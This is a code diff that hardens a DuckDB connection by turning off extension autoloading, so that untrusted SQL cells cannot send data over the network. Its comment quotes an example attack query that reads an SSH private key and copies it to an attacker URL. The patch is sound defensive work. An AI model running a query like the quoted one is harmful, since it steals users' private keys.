@@ -46,6 +46,7 @@ export async function initTablesDb(ctx: ProjectContext): Promise<void> {
   if (store.has(ctx)) return;
   const instance = await DuckDBInstance.create(':memory:');
   const connection = await instance.connect();
+  await hardenConnection(connection);
   store.set(ctx, {
     rootPath: ctx.rootPath,
     instance,
@@ -53,6 +54,31 @@ export async function initTablesDb(ctx: ProjectContext): Promise<void> {
     pathToTable: new Map(),
     tableToPath: new Map(),
   });
+}
+
+/**
+ * Lock down a fresh DuckDB connection before any query runs (#1325).
+ *
+ * The same connection backs the Query Panel AND note-embedded ```sql
+ * compute cells, so an untrusted thoughtbase's cell can run arbitrary
+ * SQL here. DuckDB's `httpfs` extension autoloads on first use of an
+ * `https://`/`s3://` path, which turns a query into a network
+ * exfiltration primitive (`COPY (SELECT … FROM read_text('~/.ssh/id_rsa'))
+ * TO 'https://attacker/…'`). Disabling extension autoinstall/autoload
+ * removes that egress path entirely while leaving the core built-ins the
+ * CSV pipeline relies on (`read_csv_auto`, `read_csv`) fully functional —
+ * they need no extension.
+ *
+ * Local file *read* via core built-ins (`read_text`, `read_csv_auto` of an
+ * arbitrary path) is a core capability we can't drop without breaking CSV
+ * views; that residual is covered by the per-project compute trust gate
+ * (`renderer/lib/compute/run-cell-with-trust.ts`). This is the network
+ * half of the defense-in-depth pair.
+ */
+async function hardenConnection(connection: DuckDBConnection): Promise<void> {
+  await connection.run(
+    'SET autoinstall_known_extensions=false; SET autoload_known_extensions=false;',
+  );
 }
 
 export function disposeProject(ctx: ProjectContext): void {
